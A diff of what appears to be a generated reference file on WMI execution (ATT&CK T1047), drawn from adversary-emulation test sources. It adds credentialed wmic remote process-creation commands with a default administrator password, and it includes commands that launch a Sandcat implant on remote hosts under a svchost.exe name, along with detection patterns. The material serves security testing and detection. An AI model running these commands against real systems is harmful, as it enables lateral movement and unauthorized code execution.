@@ -41,13 +41,17 @@ wmic /node:"#{node}" service where (caption like "%Spooler%")
 
 wmic process call create notepad.exe
 
-wmic /node:"127.0.0.1" process call create #{process_to_execute}
+wmic /user:#{user_name} /password:#{password} /node:"127.0.0.1" process call create #{process_to_execute}
 
-wmic /node:"#{node}" process call create notepad.exe
+wmic /user:DOMAIN\Administrator /password:#{password} /node:"#{node}" process call create #{process_to_execute}
+
+wmic /user:#{user_name} /password:P@ssw0rd1 /node:"#{node}" process call create #{process_to_execute}
+
+wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create notepad.exe
 
 {'windows': {'psh': {'command': 'wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n'}}}
 {'windows': {'psh': {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh";\n', 'cleanup': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" call terminate;\n'}, 'cmd': {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd";\n', 'cleanup': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" call terminate;\n'}}}
-{'windows': {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:#{domain.user.name} /password:#{domain.user.password} process call create "taskkill /f /im s4ndc4t.exe"\n'}}}
+{'windows': {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}}}
 wmic.exe /NODE:*process call create*
 wmic.exe /NODE:*path AntiVirusProduct get*
 wmic.exe /NODE:*path FirewallProduct get*
@@ -84,11 +88,20 @@ powershell/persistence/elevated/wmi
  {'command': 'wmic process call create notepad.exe\n',
   'name': None,
   'source': 'atomics/T1047/T1047.yaml'},
- {'command': 'wmic /node:"127.0.0.1" process call create '
-             '#{process_to_execute}\n',
+ {'command': 'wmic /user:#{user_name} /password:#{password} /node:"127.0.0.1" '
+             'process call create #{process_to_execute}\n',
   'name': None,
   'source': 'atomics/T1047/T1047.yaml'},
- {'command': 'wmic /node:"#{node}" process call create notepad.exe\n',
+ {'command': 'wmic /user:DOMAIN\\Administrator /password:#{password} '
+             '/node:"#{node}" process call create #{process_to_execute}\n',
+  'name': None,
+  'source': 'atomics/T1047/T1047.yaml'},
+ {'command': 'wmic /user:#{user_name} /password:P@ssw0rd1 /node:"#{node}" '
+             'process call create #{process_to_execute}\n',
+  'name': None,
+  'source': 'atomics/T1047/T1047.yaml'},
+ {'command': 'wmic /user:#{user_name} /password:#{password} /node:"#{node}" '
+             'process call create notepad.exe\n',
   'name': None,
   'source': 'atomics/T1047/T1047.yaml'},
  {'command': {'windows': {'psh': {'command': 'wmic process get '
@@ -130,19 +143,19 @@ powershell/persistence/elevated/wmi
   'source': 'data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml'},
  {'command': {'windows': {'psh': {'cleanup': 'wmic '
                                              '/node:`"#{remote.host.fqdn}`" '
-                                             '/user:#{domain.user.name} '
-                                             '/password:#{domain.user.password} '
+                                             '/user:`"#{domain.user.name}`" '
+                                             '/password:`"#{domain.user.password}`" '
                                              'process call create "taskkill /f '
                                              '/im s4ndc4t.exe"\n',
                                   'command': 'wmic '
                                              '/node:`"#{remote.host.fqdn}`" '
-                                             '/user:#{domain.user.name} '
-                                             '/password:#{domain.user.password} '
+                                             '/user:`"#{domain.user.name}`" '
+                                             '/password:`"#{domain.user.password}`" '
                                              'process call create '
                                              '"powershell.exe '
                                              'C:\\Users\\Public\\s4ndc4t.exe '
                                              '-server #{server} -group '
-                                             '#{group} -executors psh";\n'}}},
+                                             '#{group}";\n'}}},
   'name': 'Remotely executes 54ndc47 over WMI',
   'source': 'data/abilities/execution/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml'},
  {'command': 'wmic.exe /NODE:*process call create*',
@@ -693,6 +706,8 @@ powershell/persistence/elevated/wmi
                                                                                                  'is '
                                                                                                  'unreachable\n',
                                                                                   'executor': {'cleanup_command': 'wmic '
+                                                                                                                  '/user:#{user_name} '
+                                                                                                                  '/password:#{password} '
                                                                                                                   '/node:"#{node}" '
                                                                                                                   'process '
                                                                                                                   'where '
@@ -701,6 +716,8 @@ powershell/persistence/elevated/wmi
                                                                                                                   '>nul '
                                                                                                                   '2>&1\n',
                                                                                                'command': 'wmic '
+                                                                                                          '/user:#{user_name} '
+                                                                                                          '/password:#{password} '
                                                                                                           '/node:"#{node}" '
                                                                                                           'process '
                                                                                                           'call '
@@ -711,6 +728,9 @@ powershell/persistence/elevated/wmi
                                                                                                                'description': 'Ip '
                                                                                                                               'Address',
                                                                                                                'type': 'String'},
+                                                                                                      'password': {'default': 'P@ssw0rd1',
+                                                                                                                   'description': 'Password',
+                                                                                                                   'type': 'String'},
                                                                                                       'process_to_execute': {'default': 'notepad.exe',
                                                                                                                              'description': 'Name '
                                                                                                                                             'or '
@@ -719,7 +739,10 @@ powershell/persistence/elevated/wmi
                                                                                                                                             'process '
                                                                                                                                             'to '
                                                                                                                                             'execute.',
-                                                                                                                             'type': 'String'}},
+                                                                                                                             'type': 'String'},
+                                                                                                      'user_name': {'default': 'DOMAIN\\Administrator',
+                                                                                                                    'description': 'Username',
+                                                                                                                    'type': 'String'}},
                                                                                   'name': 'WMI '
                                                                                           'Execute '
                                                                                           'Remote '
@@ -830,8 +853,8 @@ powershell/persistence/elevated/wmi
                                                                    '(WMI)',
                                                            'platforms': {'windows': {'psh': {'cleanup': 'wmic '
                                                                                                         '/node:`"#{remote.host.fqdn}`" '
-                                                                                                        '/user:#{domain.user.name} '
-                                                                                                        '/password:#{domain.user.password} '
+                                                                                                        '/user:`"#{domain.user.name}`" '
+                                                                                                        '/password:`"#{domain.user.password}`" '
                                                                                                         'process '
                                                                                                         'call '
                                                                                                         'create '
@@ -841,8 +864,8 @@ powershell/persistence/elevated/wmi
                                                                                                         's4ndc4t.exe"\n',
                                                                                              'command': 'wmic '
                                                                                                         '/node:`"#{remote.host.fqdn}`" '
-                                                                                                        '/user:#{domain.user.name} '
-                                                                                                        '/password:#{domain.user.password} '
+                                                                                                        '/user:`"#{domain.user.name}`" '
+                                                                                                        '/password:`"#{domain.user.password}`" '
                                                                                                         'process '
                                                                                                         'call '
                                                                                                         'create '
@@ -851,9 +874,7 @@ powershell/persistence/elevated/wmi
                                                                                                         '-server '
                                                                                                         '#{server} '
                                                                                                         '-group '
-                                                                                                        '#{group} '
-                                                                                                        '-executors '
-                                                                                                        'psh";\n'}}},
+                                                                                                        '#{group}";\n'}}},
                                                            'requirements': [{'plugins.stockpile.app.requirements.basic': [{'edge': 'has_password',
                                                                                                                            'source': 'domain.user.name',
                                                                                                                            'target': 'domain.user.password'}]},
